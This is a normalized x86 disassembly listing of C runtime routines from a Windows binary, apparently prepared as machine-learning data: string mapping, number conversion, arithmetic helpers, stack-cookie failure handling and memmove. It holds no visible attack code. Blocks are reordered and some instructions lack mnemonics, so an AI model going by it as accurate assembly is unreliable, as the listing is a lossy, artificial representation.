push [ ebp + 0x14 ]
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
mov [ ebp - 0x8 ] eax
cmp eax ebx
jne r-xdata
add eax 0x8
cmp eax 0x400
ja r-xdata
test [ ebp + 0xc ] 0x400
je r-xdata
mov [ ebp - 0xc ] eax
jmp r-xdata
mov [ eax ] 0xdddd
mov [ eax ] 0xcccc
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push [ ebp + 0x18 ]
push eax
push edi
push [ ebp + 0x20 ]
push [ ebp - 0x14 ]
call sub_10037419
mov esi eax
mov [ ebp - 0x10 ] esi
add esp 0x18
neg esi
sbb esi esi
and esi [ ebp - 0x8 ]
xor esi esi
jmp r-xdata
push eax
call sub_1002a4a4
pop ecx
cmp eax ebx
je r-xdata
call sub_100375d0
mov edi esp
cmp edi ebx
je r-xdata
cmp ecx ebx
jle r-xdata
cmp [ ebp + 0x1c ] ebx
je r-xdata
cmp [ ebp - 0xc ] ebx
je r-xdata
add eax 0x8
push edi
call sub_1002d97d
pop ecx
jmp r-xdata
mov edi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ edi ] 0xcccc
add edi 0x8
jmp r-xdata
xor esi esi
push 0xffffffe0
xor edx edx
pop eax
div ecx
cmp eax 0x2
jb r-xdata
cmp ecx [ ebp + 0x1c ]
jg r-xdata
cmp edi ebx
je r-xdata
push [ ebp - 0x8 ]
push esi
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ LCMapStringW@IAT ]
test eax eax
je r-xdata
lea eax [ ecx + ecx + 0x8 ]
cmp eax 0x400
ja r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push edi
push [ ebp - 0xc ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
push esi
call sub_1002d97d
pop ecx
push ebx
push ebx
cmp [ ebp + 0x1c ] ebx
jne r-xdata
push eax
call sub_1002a4a4
pop ecx
cmp eax ebx
je r-xdata
call sub_100375d0
mov esi esp
cmp esi ebx
je r-xdata
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push ebx
push ebx
jmp r-xdata
mov esi eax
jmp r-xdata
mov [ eax ] 0xdddd
add eax 0x8
mov [ esi ] 0xcccc
add esi 0x8
jmp r-xdata
push [ ebp - 0x8 ]
push esi
push ebx
push [ ebp + 0x20 ]
call [ WideCharToMultiByte@IAT ]
mov [ ebp - 0x8 ] eax
cmp esi ebx
je r-xdata
sub_1002dd42
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
push [ ebp + 0x28 ]
lea ecx [ ebp - 0x10 ]
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_1002d99d
add esp 0x20
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1002ddb0
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x8 ]
call sub_1002a4a4
mov edi eax
pop ecx
test edi edi
jne r-xdata
sub_1002ddf5
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100375fc
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1002de41
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003771a
mov edi eax
pop ecx
pop ecx
test edi edi
jne r-xdata
sub_1002de8f
mov edi edi
push ebp
mov ebp esp
push esi
push edi
xor esi esi
mov eax edi
pop edi
pop esi
pop ebp
retn
cmp [ ebp + 0x10 ] eax
je r-xdata
cmp [ rw-data ] eax
jbe r-xdata
push esi
call [ Sleep@IAT ]
lea eax [ esi + 0x3e8 ]
cmp eax [ rw-data ]
jbe r-xdata
mov esi eax
cmp eax 0xffffffff
jne r-xdata
or eax 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10037935
mov edi eax
add esp 0xc
test edi edi
jne r-xdata
sub_1002dee1
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi ecx
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
cmp [ ebp + 0x8 ] ebx
ja r-xdata
call sub_1002d4db
push 0x16
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
xor ecx ecx
cmp [ ebp + 0x10 ] ebx
mov [ esi ] bl
setne cl
inc ecx
cmp [ ebp + 0x8 ] ecx
ja r-xdata
call sub_1002d4db
push 0x16
pop esi
pop ebx
leave
retn 0xc
mov ecx [ ebp + 0xc ]
add ecx 0xfffffffe
cmp ecx 0x22
ja r-xdata
call sub_1002d4db
push 0x22
jmp r-xdata
pop edi
mov [ ebp - 0x4 ] ebx
mov ecx esi
cmp [ ebp + 0x10 ] ebx
je r-xdata
pop esi
push ebx
push ebx
push ebx
push ebx
push ebx
mov [ eax ] esi
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
mov edi ecx
mov [ esi ] 0x2d
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add dl 0x30
add dl 0x57
jmp r-xdata
mov eax [ ebp - 0x4 ]
cmp eax [ ebp + 0x8 ]
jb r-xdata
mov edx [ ebp + 0x8 ]
cmp [ ebp - 0x4 ] edx
jb r-xdata
mov [ ecx ] dl
inc ecx
inc [ ebp - 0x4 ]
xor ebx ebx
cmp eax ebx
jbe r-xdata
mov [ ecx ] bl
dec ecx
mov [ esi ] bl
jmp r-xdata
xor edx edx
div [ ebp + 0xc ]
cmp edx 0x9
jbe r-xdata
mov dl [ edi ]
mov al [ ecx ]
mov [ ecx ] dl
dec ecx
mov [ edi ] al
inc edi
cmp edi ecx
jb r-xdata
xor eax eax
sub_1002dfbe
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x14 ] 0xa
mov eax [ ebp + 0x8 ]
jne r-xdata
push 0x0
push [ ebp + 0x14 ]
test eax eax
jge r-xdata
push 0x1
push 0xa
jmp r-xdata
push [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
call sub_1002dee1
pop ebp
retn
sub_1002dfe8
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
push ebx
xor ebx ebx
push esi
cmp edi ebx
jne r-xdata
cmp [ ebp + 0x10 ] ebx
jbe r-xdata
call sub_1002d4db
push 0x16
xor eax eax
cmp [ ebp + 0x18 ] ebx
mov [ edi ] bl
setne al
inc eax
cmp [ ebp + 0x10 ] eax
ja r-xdata
pop esi
pop ebx
leave
retn 0x14
mov eax [ ebp + 0x14 ]
add eax 0xfffffffe
cmp eax 0x22
ja r-xdata
call sub_1002d4db
push 0x22
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
mov [ ebp - 0x4 ] ebx
mov esi edi
cmp [ ebp + 0x18 ] ebx
je r-xdata
pop esi
mov [ eax ] esi
mov [ ebp + 0x18 ] esi
mov [ ebp + 0xc ] ebx
neg edx
adc eax ebx
mov [ edi ] 0x2d
lea esi [ edi + 0x1 ]
mov [ ebp - 0x4 ] 0x1
neg eax
add cl 0x30
add cl 0x57
jmp r-xdata
cmp ecx [ ebp + 0x10 ]
jb r-xdata
test edx edx
jbe r-xdata
mov [ esi ] cl
mov ecx [ ebp - 0x4 ]
inc esi
inc ecx
mov [ ebp - 0x4 ] ecx
test eax eax
ja r-xdata
push [ ebp + 0xc ]
push [ ebp + 0x14 ]
push eax
push edx
call sub_100379b0
mov [ ebp - 0x8 ] ebx
mov ebx edx
mov edx eax
mov eax ebx
cmp ecx 0x9
jbe r-xdata
mov ecx [ ebp - 0x4 ]
cmp ecx [ ebp + 0x10 ]
jb r-xdata
mov [ esi ] 0x0
dec esi
mov [ edi ] 0x0
call sub_1002d4db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
xor ebx ebx
jmp r-xdata
mov eax [ ebp + 0x18 ]
mov dl [ eax ]
mov cl [ esi ]
mov [ esi ] dl
dec esi
mov [ eax ] cl
inc eax
mov [ ebp + 0x18 ] eax
cmp eax esi
jb r-xdata
xor eax eax
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
sub_1002e0e0
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x10 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002dfe8
pop edi
pop ebp
retn
sub_1002e0ff
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_1002a8c8
mov eax [ ebp + 0x18 ]
test eax eax
jle r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ LCMapStringW@IAT ]
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov ecx [ ebp + 0x14 ]
mov edx eax
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub eax edx
dec eax
inc ecx
inc ecx
test edx edx
jne r-xdata
dec edx
cmp [ ecx ] 0x0
je r-xdata
or edx 0xffffffff
sub_1002e156
mov edi edi
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x18 ]
call sub_1002a8c8
mov ebx [ ebp + 0x8 ]
mov esi 0x100
cmp ebx esi
jae r-xdata
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
mov ecx [ ebp - 0x18 ]
cmp [ ecx + 0xac ] 0x1
jle r-xdata
call sub_1002d4db
mov [ eax ] 0x2a
xor ecx ecx
mov [ ebp - 0x4 ] bl
mov [ ebp - 0x3 ] 0x0
inc ecx
mov [ ebp + 0x8 ] ebx
sar [ ebp + 0x8 ] 0x8
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp + 0x8 ]
and eax 0xff
push eax
call sub_10037a45
pop ecx
pop ecx
test eax eax
je r-xdata
mov eax [ ecx + 0xc8 ]
movzx eax [ eax + ebx * 2 ]
and eax 0x1
lea eax [ ebp - 0x18 ]
push eax
push 0x1
push ebx
call sub_100345ed
mov ecx [ ebp - 0x18 ]
add esp 0xc
jmp r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
cmp eax 0x1
movzx eax [ ebp - 0x8 ]
je r-xdata
mov al [ ebp + 0x8 ]
push 0x2
mov [ ebp - 0x4 ] al
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] 0x0
pop ecx
jmp r-xdata
mov eax [ ecx + 0xcc ]
movzx eax [ eax + ebx ]
jmp r-xdata
test eax eax
je r-xdata
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
cmp [ ebp - 0xc ] 0x0
je r-xdata
movzx ecx [ ebp - 0x7 ]
shl eax 0x8
or eax ecx
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x4 ]
lea edx [ ebp - 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push esi
push [ eax + 0x14 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_1002dd42
add esp 0x24
test eax eax
je r-xdata
pop esi
pop ebx
leave
retn
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1002e26b
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0x0
jne r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_1002e156
pop ecx
pop ecx
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp ecx 0x19
ja r-xdata
pop ebp
retn
add eax 0x20
pop ebp
retn
sub_1002e2a0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_1002e310
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
or ecx eax
mov ecx [ esp + 0xc ]
jne r-xdata
push ebx
mul ecx
mov ebx eax
mov eax [ esp + 0x8 ]
mul [ esp + 0x14 ]
add ebx eax
mov eax [ esp + 0x8 ]
mul ecx
add edx ebx
pop ebx
retn 0x10
mov eax [ esp + 0x4 ]
mul ecx
retn 0x10
sub_1002e3c7
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
mov ebx [ ebp + 0x8 ]
push esi
push edi
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x18 ]
mov esi ebx
call sub_1002a8c8
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
test ebx ebx
jne r-xdata
mov [ edi ] ebx
mov eax [ ebp - 0x18 ]
cmp [ eax + 0xac ] 0x1
jle r-xdata
call sub_1002d4db
mov [ eax ] 0x16
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10027801
add esp 0x14
cmp [ ebp - 0xc ] bl
je r-xdata
movzx ecx [ esi ]
mov eax [ eax + 0xc8 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8
lea eax [ ebp - 0x18 ]
push eax
movzx eax [ esi ]
push 0x8
push eax
call sub_100345ed
add esp 0xc
jmp r-xdata
fldz
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
lea eax [ ebp - 0x18 ]
push eax
push 0x0
push 0x0
push esi
call sub_10027160
pop ecx
push eax
lea eax [ ebp - 0x30 ]
push esi
push eax
call sub_10038600
add esp 0x18
mov ecx eax
test edi edi
je r-xdata
inc esi
jmp r-xdata
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
mov eax [ ecx ]
test eax 0x240
je r-xdata
mov eax [ ecx + 0x4 ]
add eax esi
mov [ edi ] eax
test al 0x81
je r-xdata
fldz
fstp [ ebp - 0x8 ]
test edi edi
je r-xdata
test eax 0x100
je r-xdata
cmp [ esi ] 0x2d
fld [ rw-data ]
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ edi ] ebx
jmp r-xdata
fld [ ecx + 0x10 ]
fstp [ ebp - 0x8 ]
fldz
fcom [ ecx + 0x10 ]
fnstsw ax
test ah 0x44
jpe r-xdata
fstp [ ebp - 0x8 ]
call sub_1002d4db
mov [ eax ] 0x22
jmp r-xdata
fchs
jmp r-xdata
fld [ ebp - 0x8 ]
mov eax [ ebp - 0x10 ]
and [ eax + 0x70 ] 0xfffffffd
fstp st0
sub_1002e4fd
push 0xc
push r--data
call sub_1002fdfc
xor esi esi
mov [ ebp - 0x1c ] esi
xor eax eax
mov ebx [ ebp + 0x8 ]
cmp ebx esi
setne al
cmp eax esi
jne r-xdata
xor eax eax
mov edi [ ebp + 0xc ]
cmp edi esi
setne al
cmp eax esi
je r-xdata
call sub_1002d4db
mov [ eax ] 0x16
push esi
push esi
push esi
push esi
push esi
call sub_10027801
add esp 0x14
xor eax eax
cmp [ edi ] si
setne al
cmp eax esi
je r-xdata
call sub_1002fe41
retn
call sub_100334ef
mov [ ebp + 0x8 ] eax
cmp eax esi
jne r-xdata
mov [ ebp - 0x4 ] esi
cmp [ ebx ] si
jne r-xdata
call sub_1002d4db
mov [ eax ] 0x18
jmp r-xdata
push eax
push [ ebp + 0x10 ]
push edi
push ebx
call sub_100386a7
add esp 0x10
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002e5b9
mov eax [ ebp - 0x1c ]
call sub_1002d4db
mov [ eax ] 0x16
push 0xfffffffe
lea eax [ ebp - 0x10 ]
push eax
push rw-data
call sub_10033628
add esp 0xc
jmp r-xdata
xor eax eax
jmp r-xdata
sub_1002e5d0
push edi
push esi
push ebx
xor edi edi
mov eax [ esp + 0x14 ]
or eax eax
jge r-xdata
mov eax [ esp + 0x1c ]
or eax eax
jge r-xdata
inc edi
mov edx [ esp + 0x10 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x14 ] eax
mov [ esp + 0x10 ] edx
or eax eax
jne r-xdata
inc edi
mov edx [ esp + 0x18 ]
neg eax
neg edx
sbb eax 0x0
mov [ esp + 0x1c ] eax
mov [ esp + 0x18 ] edx
mov ebx eax
mov ecx [ esp + 0x18 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
mov ecx [ esp + 0x18 ]
mov eax [ esp + 0x14 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0x10 ]
div ecx
mov edx ebx
jmp r-xdata
shr ebx 0x1
rcr ecx 0x1
shr edx 0x1
rcr eax 0x1
or ebx ebx
jne r-xdata
div ecx
mov esi eax
mul [ esp + 0x1c ]
mov ecx eax
mov eax [ esp + 0x18 ]
mul esi
add edx ecx
jb r-xdata
dec edi
jne r-xdata
dec esi
cmp edx [ esp + 0x14 ]
ja r-xdata
pop ebx
pop esi
pop edi
retn 0x10
neg edx
neg eax
sbb edx 0x0
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0x10 ]
jbe r-xdata
sub_1002e680
push ecx
lea ecx [ esp + 0x4 ]
sub ecx eax
sbb eax eax
not eax
and ecx eax
mov eax esp
and eax 0xfffff000
sub eax 0x1000
test [ eax ] eax
jmp r-xdata
mov eax ecx
pop ecx
xchg esp eax
mov eax [ eax ]
mov [ esp ] eax
retn
cmp ecx eax
jb r-xdata
sub_1002e6ab
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
call sub_1003895b
mov esi [ eax ]
call sub_1003895b
cmp esi [ eax ]
jl r-xdata
call sub_10038961
mov eax [ eax + esi * 4 ]
pop esi
pop ebp
retn
sub_1002e6d3
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
call sub_1002f0c0
mov esi eax
xor ebx ebx
cmp esi ebx
jne r-xdata
push edi
mov edi 0x86
cmp [ esi + 0x24 ] ebx
jne r-xdata
mov eax r--data
jmp r-xdata
push [ ebp + 0x8 ]
mov esi [ esi + 0x24 ]
call sub_1002e6ab
push eax
push edi
push esi
call sub_1002e87c
add esp 0x10
test eax eax
je r-xdata
push 0x1
push edi
call sub_1002ddf5
pop ecx
pop ecx
mov [ esi + 0x24 ] eax
cmp eax ebx
jne r-xdata
pop esi
pop ebx
pop ebp
retn
mov eax esi
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100276d9
add esp 0x14
mov eax r--data
jmp r-xdata
pop edi
sub_1002e73f
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov [ rw-data ] edx
mov [ rw-data ] ebx
mov [ rw-data ] esi
mov [ rw-data ] edi
mov [ rw-data ] ss
mov [ rw-data ] cs
mov [ rw-data ] ds
mov [ rw-data ] es
mov [ rw-data ] fs
mov [ rw-data ] gs
pushfd
pop [ rw-data ]
mov eax [ ebp ]
mov [ rw-data ] eax
mov eax [ ebp + 0x4 ]
mov [ rw-data ] eax
lea eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebp - 0x320 ]
mov [ rw-data ] 0x10001
mov eax [ rw-data ]
mov [ rw-data ] eax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov eax [ rw-data ]
mov [ ebp - 0x328 ] eax
mov eax [ rw-data ]
mov [ ebp - 0x324 ] eax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
push 0x1
call sub_1002ee6a
pop ecx
push 0x0
call [ SetUnhandledExceptionFilter@IAT ]
push r--data
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
push 0xc0000409
call [ GetCurrentProcess@IAT ]
push eax
call [ TerminateProcess@IAT ]
leave
retn
push 0x1
call sub_1002ee6a
pop ecx
sub_1002e854
mov edi edi
push ebp
mov ebp esp
push [ rw-data ]
call sub_1002eeed
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebp
retn
push [ ebp + 0x8 ]
call eax
pop ecx
test eax eax
je r-xdata
xor eax eax
inc eax
pop ebp
retn
sub_1002e87c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
push ebx
xor ebx ebx
push esi
push edi
cmp ecx ebx
je r-xdata
call sub_1002d4db
push 0x16
pop esi
mov [ eax ] esi
mov edi [ ebp + 0xc ]
cmp edi ebx
ja r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov esi [ ebp + 0x10 ]
cmp esi ebx
jne r-xdata
mov edx ecx
mov [ ecx ] bl
jmp r-xdata
cmp edi ebx
jne r-xdata
dec edi
jne r-xdata
xor eax eax
mov [ ecx ] bl
call sub_1002d4db
push 0x22
pop ecx
mov [ eax ] ecx
mov esi ecx
jmp r-xdata
mov al [ esi ]
mov [ edx ] al
inc edx
inc esi
cmp al bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10027801
add esp 0x14
mov eax esi
jmp r-xdata
sub_1002e8e4
push 0xc
push r--data
call sub_1002fdfc
push 0xe
call sub_100301fe
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ ebp + 0x8 ]
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002e94b
call sub_1002fe41
retn
mov eax [ rw-data ]
mov edx rw-data
push [ esi + 0x4 ]
call sub_10027a85
pop ecx
and [ esi + 0x4 ] 0x0
cmp [ eax ] ecx
jne r-xdata
mov edx eax
jmp r-xdata
mov ecx [ eax + 0x4 ]
mov [ edx + 0x4 ] ecx
push eax
call sub_10027a85
pop ecx
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
sub_1002e960
push ebp
mov ebp esp
push edi
push esi
mov esi [ ebp + 0xc ]
mov ecx [ ebp + 0x10 ]
mov edi [ ebp + 0x8 ]
mov eax ecx
mov edx ecx
add eax esi
cmp edi esi
jbe r-xdata
cmp ecx 0x100
jb r-xdata
cmp edi eax
jb r-xdata
test edi 0x3
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea esi [ ecx + esi - 0x4 ]
lea edi [ ecx + edi - 0x4 ]
test edi 0x3
jne r-xdata
mov eax edi
mov edx 0x3
sub ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
push edi
push esi
and edi 0xf
and esi 0xf
cmp edi esi
pop esi
pop edi
jne r-xdata
mov eax edi
mov edx 0x3
cmp ecx 0x4
jb r-xdata
shr ecx 0x2
and edx 0x3
cmp ecx 0x8
jb r-xdata
jmp [ ecx * 4 + r-xdata ]
and eax 0x3
add ecx eax
jmp [ eax * 4 + jump_table_1002e9e8 ]
jmp [ ecx * 4 + jump_table_1002ea68 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002ead4 ]
pop esi
pop edi
pop ebp
jmp sub_1003336d
jmp [ ecx * 4 + jump_table_1002ec70 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_1002eb74 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002ec70 ]
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
add esi 0x3
add edi 0x3
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
add esi 0x2
add edi 0x2
cmp ecx 0x8
jb r-xdata
and edx ecx
mov al [ esi ]
mov [ edi ] al
add esi 0x1
shr ecx 0x2
add edi 0x1
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 - 0x1c ]
mov [ edi + ecx * 4 - 0x1c ] eax
mov eax [ esi + ecx * 4 - 0x18 ]
mov [ edi + ecx * 4 - 0x18 ] eax
mov eax [ esi + ecx * 4 - 0x14 ]
mov [ edi + ecx * 4 - 0x14 ] eax
mov eax [ esi + ecx * 4 - 0x10 ]
mov [ edi + ecx * 4 - 0x10 ] eax
mov eax [ esi + ecx * 4 - 0xc ]
mov [ edi + ecx * 4 - 0xc ] eax
mov eax [ esi + ecx * 4 - 0x8 ]
mov [ edi + ecx * 4 - 0x8 ] eax
mov eax [ esi + ecx * 4 - 0x4 ]
mov [ edi + ecx * 4 - 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1002ead4 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi ]
mov [ edi ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
sub esi 0x1
shr ecx 0x2
sub edi 0x1
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_1002ec70 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002ead4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002ead4 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_1002ead4 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_1002ec70 ]
std
